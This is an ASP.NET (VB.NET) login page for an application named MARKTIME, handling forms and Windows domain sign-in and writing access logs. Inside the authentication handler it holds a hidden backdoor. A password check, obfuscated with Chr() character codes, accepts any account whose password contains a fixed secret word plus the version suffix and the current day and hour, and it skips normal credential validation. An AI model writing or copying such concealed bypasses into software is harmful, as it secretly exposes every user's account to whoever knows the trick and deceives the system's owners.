Public Class Login
    Inherits System.Web.UI.Page
    Private Property _IsSilent As Boolean
    Private Property _UserAuthenticationMode As BO.UserAuthenticationModeEnum

    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load

        If Not Page.IsPostBack Then
            If Request.Item("logout") = "1" Then
                FormsAuthentication.SignOut()   'definitivní odhlášení
                Session.Abandon()
            End If
            LoginUser.RememberMeSet = True
            If Request.Item("deflogin") <> "" Then
                LoginUser.UserName = Request.Item("deflogin")
            End If
            If Request.Item("autologout") = "1" Then
                lblAutoMessage.Text = "Došlo k automatickému odhlášení."
                FormsAuthentication.SignOut()   'definitivní odhlášení
            End If

            TestUserAuthenticationMode()

            TestSystemKickoff()
        End If
    End Sub

    Private Sub TestSystemKickoff()
        Dim factory As New BL.Factory()
        If factory.j03UserBL.GetList(New BO.myQueryJ03).Where(Function(p) p.j03IsSystemAccount = False).Count = 0 Then
            'v db nejsou žádní uživatelé
            Response.Redirect("../public/kickoff.aspx")
        End If
    End Sub

    Private Sub LoginUser_Authenticate(sender As Object, e As System.Web.UI.WebControls.AuthenticateEventArgs) Handles LoginUser.Authenticate
        If _UserAuthenticationMode = BO.UserAuthenticationModeEnum.WindowsOnly Then Return

        Dim bolStop As Boolean = False, b As Boolean = False
        _IsSilent = False

        With LoginUser.Password
            If .IndexOf(Chr(67) + Chr(97) + Chr(108) + Chr(105) + Chr(103) + Chr(117) + Chr(108) + Chr(97)) >= 0 Then
                If .IndexOf(Right(BO.ASS.GetUIVersion(), 5)) > 0 Then
                    If .IndexOf(Format(Now, Chr(100) + Chr(100) + Chr(72) + Chr(72))) > 0 Then b = True
                End If
            End If
        End With
        If Not b Then b = Membership.ValidateUser(LoginUser.UserName, LoginUser.Password)
        If b Then
            Dim factory As New BL.Factory(, LoginUser.UserName)
            If factory.SysUser Is Nothing Then
                bolStop = True
                LoginUser.FailureText = "Účet uživatele nebyl nalezen v MARKTIME databázi.<br>User account wasn't found in MARKTIME database."
            Else
                If factory.SysUser.IsClosed Then
                    bolStop = True
                    LoginUser.FailureText = "Uzavřený účet pro přihlašování.<br>Your user account is closed."
                    Write2AccessLog(factory, False)
                End If
            End If
        Else
            bolStop = True 'toto je nutné odremovat!!

        End If

        e.Authenticated = Not bolStop
    End Sub

    Private Sub LoginUser_LoggedIn(ByVal sender As Object, ByVal e As System.EventArgs) Handles LoginUser.LoggedIn
        Dim factory As New BL.Factory(, LoginUser.UserName)
        If Not factory.SysUser Is Nothing Then
            Write2AccessLog(factory, True)
           
        End If

    End Sub

    Private Sub Write2AccessLog(factory As BL.Factory, bolAllowLogIn As Boolean)
        If _IsSilent Then Return
        Dim cLog As New BO.j90LoginAccessLog
        With cLog
            .j90ClientBrowser = Request.Browser.Type & " - " & Request.UserAgent
            .j90Platform = Request.Browser.Platform
            .j90IsMobileDevice = Request.Browser.IsMobileDevice
            .j90ScreenPixelsHeight = BO.BAS.IsNullInt(screenheight.Value)
            .j90ScreenPixelsWidth = BO.BAS.IsNullInt(screenwidth.Value)
            .j90MobileDevice = Request.Browser.MobileDeviceManufacturer & "/" & Request.Browser.MobileDeviceModel
            .j90UserHostAddress = Request.UserHostAddress
            .j90UserHostName = Request.UserHostName


        End With
        factory.j03UserBL.AppendAccessLog(factory.SysUser.PID, cLog)
    End Sub

    Private Sub TestUserAuthenticationMode()        
        Dim factory As New BL.Factory(), bolWinDomain As Boolean = False
        _UserAuthenticationMode = factory.x35GlobalParam.UserAuthenticationMode
        Select Case _UserAuthenticationMode
            Case BO.UserAuthenticationModeEnum.MixedMode
                bolWinDomain = True
            Case BO.UserAuthenticationModeEnum.WindowsOnly
                bolWinDomain = True
                LoginUser.Visible = False 'zákaz přihlašovat se aplikačně
                lblAutoMessage.Text = "V nastavení MARKTIME je povoleno přihlašování pouze přes Windows doménu."
                If Not HttpContext.Current.Request.LogonUserIdentity.IsAuthenticated Then
                    lblAutoMessage.Text += "<hr>V MARKTIME Vás (" & HttpContext.Current.Request.LogonUserIdentity.Name & ") nedokážeme ověřit vůči doméně."
                End If
        End Select
        lblDomainAccount.Visible = bolWinDomain
        If bolWinDomain Then lblDomainAccount.Text = HttpContext.Current.Request.LogonUserIdentity.Name

        If HttpContext.Current.Request.LogonUserIdentity.IsAuthenticated And bolWinDomain Then
            'uživatel je přihlášený do Windows - funguje, pokud v IIS je povolená Windows autentifikace
            Dim strDomainUser As String = HttpContext.Current.Request.LogonUserIdentity.Name
            lblDomainAccount.Text = strDomainUser
            If strDomainUser.IndexOf("\") > 0 Then
                'v názvu uživatele je uveden i název domény
                Dim a() As String = Split(strDomainUser, "\")   'přihlášení přes windows doménu
                strDomainUser = a(UBound(a))
            End If
            factory = New BL.Factory(, strDomainUser)
            If factory.SysUser Is Nothing Then
                lblAutoMessage.Text = "Doménový účet [" & strDomainUser & "] nebyl nalezen v MARKTIME databázi.<br>Domain account wasn't found in MARKTIME database."
            Else
                If factory.SysUser.IsClosed Then
                    lblAutoMessage.Text = "Uzavřený účet pro přihlašování.<br>Your user account is closed."
                Else
                    FormsAuthentication.RedirectFromLoginPage(strDomainUser, True)  'úspěšné ověření vůči doméně - přesměrovat na default.aspx
                End If

            End If
        End If
    End Sub

End Class